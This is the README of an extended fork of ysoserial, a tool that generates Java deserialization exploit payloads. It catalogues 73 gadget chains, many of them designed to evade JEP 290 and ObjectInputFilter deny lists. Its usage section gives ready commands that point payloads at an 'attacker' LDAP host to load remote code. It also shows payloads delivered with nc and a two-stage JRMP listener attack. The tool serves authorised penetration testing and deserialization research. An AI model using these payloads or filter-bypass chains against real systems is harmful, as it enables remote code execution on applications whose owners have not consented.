
# ysoserial (extended)

Fork of [frohoff/ysoserial](https://github.com/frohoff/ysoserial) with **26+ additional gadget chains** from academic papers (JDD, FLASH, GCMiner), independent research, and automated fuzzer discovery. Focuses on filter-bypass entry points, cross-library evasion, and JDK 17+ compatible sinks.

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

## What's New in `extended`

### Filter-Bypass Entry Points

Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically block `HashMap`, `HashSet`, `PriorityQueue`, and `Hashtable`. These new chains use alternative entry classes:

| Entry Class | Chains | Why It Bypasses |
|-------------|--------|-----------------|
| `ConcurrentHashMap` | CC10, CC11, ROME4, Hibernate3, ROMEJndi | Rarely blocked — used extensively in JDK internals |
| `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
| `LinkedHashSet` | CC12, CC13 †, CC15 | Extends HashSet but class-level filters often miss it |
| `TreeSet` | Click2, BeanShell2 | Standard JDK class, never blocked in known filters |
| `BadAttributeValueExpException` | ROME2, Jackson1, Jackson2 | JMX class, not commonly filtered |
| `Hashtable` | ROME3 | Some filters miss this older Map implementation |

### Filter-Bypass Sinks (InvokerTransformer Alternatives)

`InvokerTransformer` is one of the most commonly filtered CC classes. These chains avoid it entirely:

| Chain | Sink | How It Avoids InvokerTransformer |
|-------|------|----------------------------------|
| `CC14` | `InstantiateTransformer` → `TrAXFilter` → `TemplatesImpl` | Same package as InvokerTransformer, but rarely filtered |
| `CC15` | Same as CC14 + LinkedHashSet root | Double evasion: root + sink bypass |
| `CC13` † | Cross-library CC4→CC3 + InvokerTransformer | Version-specific filters miss cross-library |

### JDK 17+ Compatible (No TemplatesImpl)

These chains work without `--add-opens java.xml` by using JNDI sinks instead of `TemplatesImpl`:

| Chain | Sink | Usage |
|-------|------|-------|
| `CommonsCollectionsJndi` | `InitialContext.doLookup()` | `java -jar ysoserial.jar CommonsCollectionsJndi 'ldap://attacker/Exploit'` |
| `CommonsCollectionsJndi2` † | CC4+CC3 cross-lib → `doLookup()` | `java -jar ysoserial.jar CommonsCollectionsJndi2 'ldap://attacker/Exploit'` |
| `Jackson2` | `POJONode` → `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar Jackson2 'ldap://attacker/Exploit'` |
| `ROMEJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar ROMEJndi 'ldap://attacker/Exploit'` |
| `CommonsBeanutilsJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar CommonsBeanutilsJndi 'ldap://attacker/Exploit'` |
| `CommonsBeanutilsJndi2` | `JdbcRowSetImpl` → JNDI | CB + CC4 variant |
| `CommonsBeanutils4` | `JdbcRowSetImpl` → JNDI | CB + PriorityQueue + JNDI sink |
| `CommonsBeanutilsH2` | `JdbcRowSetImpl` → H2 JDBC INIT | RCE via H2 SQL (requires H2 1.x on target) |
| `WildFly1` | `InitialContext.lookup()` | Direct JNDI from `readObject()` — 120 bytes |

### Jackson-databind Chains (NEW)

Native Java deserialization chains using jackson-databind (one of the most common Java dependencies):

| Chain | Discoverer | Sink | Description |
|-------|-----------|------|-------------|
| `Jackson1` | @Y4tacker, @mbechler | `TemplatesImpl` bytecode | `BadAttributeValueExpException` → `POJONode.toString()` → getter invocation → RCE |
| `Jackson2` | @Y4tacker, @mbechler | `JdbcRowSetImpl` JNDI | Same trigger, JNDI sink — JDK 17+ friendly |

### JDK-Only Chains (No Library Dependencies)

| Chain | Discoverer | Target JDK | Description |
|-------|-----------|------------|-------------|
| `Jdk7u21` | @frohoff | JRE ≤ 7u21 | `AnnotationInvocationHandler` + hash collision → `TemplatesImpl` |
| `Jdk8u20` | @pwntester, @mwulftange | JRE ≤ 8u20 | Bypasses 7u25 AIH fix via `BeanContextSupport` exception swallowing |
| `JRMPClient` | @mbechler | All | JRMP outbound connection (use with `JRMPListener` exploit) |
| `URLDNS` | @gebl | All | DNS lookup only (no RCE, useful for detection) |

### Nested Deserialization Wrappers

These bypass first-layer type filters by wrapping an inner payload:

| Chain | Discoverer | Mechanism |
|-------|-----------|-----------|
| `SignedObjectWrap` | @BofeiC | `SignedObject` → nested `ObjectInputStream` |
| `C3P02` | @mbechler | C3P0 `WrapperConnectionPoolDataSource` hex-encoded nested deser |

### Other New Chains

| Chain | Discoverer | Description |
|-------|-----------|-------------|
| `ROME2` | @mbechler | ROME via `BadAttributeValueExpException` + `Unsafe.putObject()` (JDK 17 val field bypass) |
| `ROME3` | @mbechler | ROME via `Hashtable` with manual Entry construction |
| `GroovyGStr` | @BofeiC | Groovy `GString` + `LazyMap` — no `AnnotationInvocationHandler` needed |
| `HibernateCK` | @BofeiC | Hibernate `CacheKey` entry (Hibernate 4.x only) |
| `VaadinMP` | @BofeiC | Vaadin `MethodProperty` → arbitrary getter invocation |
| `CommonsBeanutils3` | @BofeiC | CB + TreeBag entry — bypasses PriorityQueue AND InvokerTransformer filters |
| `Click2` | @BofeiC | Apache Click via TreeSet entry — bypasses PriorityQueue filters |
| `BeanShell2` | @BofeiC | BeanShell interpreter via TreeSet entry — bypasses PriorityQueue filters |
| `CommonsCollections13` | @dmbs335 † | CC4 TiedMapEntry + CC3 LazyMap + LinkedHashSet — cross-library + root bypass |
| `CommonsCollections14` | @zema1 | CC6 trigger + InstantiateTransformer sink — InvokerTransformer filter bypass |
| `CommonsCollections15` | @zema1, @BofeiC | LinkedHashSet + InstantiateTransformer — double evasion (root + sink) |

> **†** Discovered by @dmbs335 via automated differential fuzzing ([web-fuzzer](https://github.com/dmbs335/web-fuzzer), 2026-03-14). The fuzzer's deserialization domain identified novel cross-library CC3+CC4 chain combinations that bypass version-specific filters.

### Exploit Tools

| Tool | Author | Usage |
|------|--------|-------|
| `JRMPListener` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port> <payload> <cmd>` |
| `RMIRegistryExploit` | @mbechler | `java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <host> <port> <payload> <cmd>` |

## All Payloads (73 total)

```
Payload                Authors                                Dependencies
-------                -------                                ------------
AspectJWeaver          @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
Atomikos               @pwntester, @sciccone                  transactions-osgi:4.0.6, jta:1.1
BeanShell1             @pwntester, @cschneider4711            bsh:2.0b5
BeanShell2             @BofeiC                                bsh:2.0b5
C3P0                   @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
C3P02                  @mbechler                              c3p0:0.9.5.2, commons-collections:3.1
Ceylon                 @kai_ullrich                           ceylon.language:1.3.3
Click1                 @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
Click2                 @BofeiC                                click-nodeps:2.3.0, javax.servlet-api:3.1.0
Clojure                @JackOfMostTrades                      clojure:1.8.0
Clojure2               @JackOfMostTrades                      clojure:1.8.0
CommonsBeanutils1      @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1
CommonsBeanutils2      @k4n5ha0                               commons-beanutils:1.9.2
CommonsBeanutils3      @BofeiC                                commons-beanutils:1.9.2, commons-collections4:4.0
CommonsBeanutils4      @BofeiC                                commons-beanutils:1.9.2, commons-collections:3.1
CommonsBeanutilsH2     @BofeiC                                commons-beanutils:1.9.2
CommonsBeanutilsJndi   @frohoff                               commons-beanutils:1.9.2
CommonsBeanutilsJndi2  @BofeiC                                commons-beanutils:1.9.2, commons-collections4:4.0
CommonsCollections1    @frohoff                               commons-collections:3.1
CommonsCollections2    @frohoff                               commons-collections4:4.0
CommonsCollections3    @frohoff                               commons-collections:3.1
CommonsCollections4    @frohoff                               commons-collections4:4.0
CommonsCollections5    @matthias_kaiser, @jasinner            commons-collections:3.1
CommonsCollections6    @matthias_kaiser                       commons-collections:3.1
CommonsCollections7    @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
CommonsCollections8    @navalorenzo                           commons-collections4:4.0
CommonsCollections9    @meizjm3i                              commons-collections:3.2.1
CommonsCollections10   @BofeiC                                commons-collections:3.1
CommonsCollections11   @BofeiC                                commons-collections4:4.0
CommonsCollections12   @BofeiC                                commons-collections:3.1
CommonsCollections13   @dmbs335 †                             commons-collections:3.1, commons-collections4:4.0
CommonsCollections14   @zema1                                 commons-collections:3.1
CommonsCollections15   @zema1, @BofeiC                        commons-collections:3.1
CommonsCollectionsJndi @BofeiC                                commons-collections:3.1
CommonsCollectionsJndi2 @dmbs335 †                            commons-collections:3.1, commons-collections4:4.0
FileUpload1            @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
Groovy1                @frohoff                               groovy:2.3.9
GroovyGStr             @BofeiC                                groovy:2.4.3
Hibernate1             @mbechler                              hibernate-core:4.3.11.Final
Hibernate2             @mbechler                              hibernate-core:4.3.11.Final
Hibernate3             @BofeiC                                hibernate-core:4.3.11.Final
HibernateCK            @BofeiC                                hibernate-core:4.3.11.Final
Jackson1               @Y4tacker, @mbechler                   jackson-databind:2.12.7.1
Jackson2               @Y4tacker, @mbechler                   jackson-databind:2.12.7.1
JBossInterceptors1     @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final
JRMPClient             @mbechler
JSON1                  @mbechler                              json-lib:2.4, spring-aop:4.1.4, commons-beanutils:1.9.2
JavassistWeld1         @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final
Jdk7u21                @frohoff
Jdk8u20                @pwntester, @mwulftange
Jython1                @pwntester, @cschneider4711            jython-standalone:2.5.2
Jython2                @pwntester, @cschneider4711, @ykoster  jython-standalone:2.5.2
MozillaRhino1          @matthias_kaiser                       js:1.7R2
MozillaRhino2          @_tint0                                js:1.7R2
Myfaces1               @mbechler
Myfaces2               @mbechler
ROME                   @mbechler                              rome:1.0
ROME2                  @mbechler                              rome:1.0
ROME3                  @mbechler                              rome:1.0
ROME4                  @BofeiC                                rome:1.0
ROMEJndi               @BofeiC                                rome:1.0
Scala                  @mbechler                              scala-library:2.12.6
SignedObjectWrap       @BofeiC                                commons-beanutils:1.9.2
Spring1                @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
Spring2                @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE
SpringJta              @zerothoughts, @sciccone               spring-tx:5.1.7.RELEASE, spring-context:5.1.7.RELEASE
Struts2JasperReports   @sciccone                              struts2-core:2.5.20
URLDNS                 @gebl
Vaadin1                @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
VaadinMP               @BofeiC                                vaadin-server:7.7.14, vaadin-shared:7.7.14
Wicket1                @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
WildFly1               @BofeiC                                wildfly-connector:26.0.1.Final
```

## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](
        https://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
# RCE via TemplatesImpl (classic)
java -jar ysoserial.jar CommonsCollections6 'calc.exe' > payload.bin

# RCE via JNDI (JDK 17+ friendly, no TemplatesImpl)
java -jar ysoserial.jar CommonsCollectionsJndi 'ldap://attacker:1389/Exploit' > payload.bin

# Jackson-databind: POJONode → TemplatesImpl
java -jar ysoserial.jar Jackson1 'calc.exe' > payload.bin

# Jackson-databind: POJONode → JNDI (JDK 17+, no --add-opens needed)
java -jar ysoserial.jar Jackson2 'ldap://attacker:1389/Exploit' > payload.bin

# Filter bypass: InvokerTransformer → InstantiateTransformer (rarely filtered)
java -jar ysoserial.jar CommonsCollections14 'calc.exe' > payload.bin

# Double evasion: LinkedHashSet root + InstantiateTransformer sink
java -jar ysoserial.jar CommonsCollections15 'calc.exe' > payload.bin

# Cross-library evasion: CC4 TiedMapEntry + CC3 LazyMap
java -jar ysoserial.jar CommonsCollections13 'calc.exe' > payload.bin

# Nested wrapper: C3P0 hex-encoded second-order deserialization
java -jar ysoserial.jar C3P02 'calc.exe' > payload.bin

# Cross-library + JNDI sink
java -jar ysoserial.jar CommonsCollectionsJndi2 'ldap://attacker:1389/Exploit' > payload.bin

# Nested wrapper to bypass first-layer type filters
java -jar ysoserial.jar SignedObjectWrap 'calc.exe' > payload.bin

# Two-stage: send JRMPClient payload to victim, run listener to serve second stage
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'calc.exe'
java -jar ysoserial.jar JRMPClient 'attacker:1099' > payload.bin
```

### JDK 17+ Note

On JDK 17+, payloads using `TemplatesImpl` require module opens at **generation time**:

```shell
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     -jar ysoserial.jar ROME 'calc.exe' > payload.bin
```

JNDI-based payloads (`CommonsCollectionsJndi`, `Jackson2`, `ROMEJndi`, `WildFly1`) do **not** need these flags.

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Building

Requires Java 17+ and Maven 3.x+

```shell
mvn clean package -DskipTests
```

## References

* [JDD (S&P 2024)](https://doi.org/10.1109/SP54263.2024.00188) — Automated gadget chain discovery
* [FLASH (S&P 2024)](https://doi.org/10.1109/SP54263.2024.00189) — Filter-aware chain construction
* [GCMiner (CCS 2023)](https://doi.org/10.1145/3576915.3616620) — Graph-based gadget chain mining
* [Handcrafted Gadgets (Code White)](https://codewhitesec.blogspot.com/2018/01/handcrafted-gadgets.html) — Jdk8u20 chain analysis by @mwulftange
* [marshalsec](https://github.com/frohoff/marshalsec) — Java deserialization research by @mbechler
* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
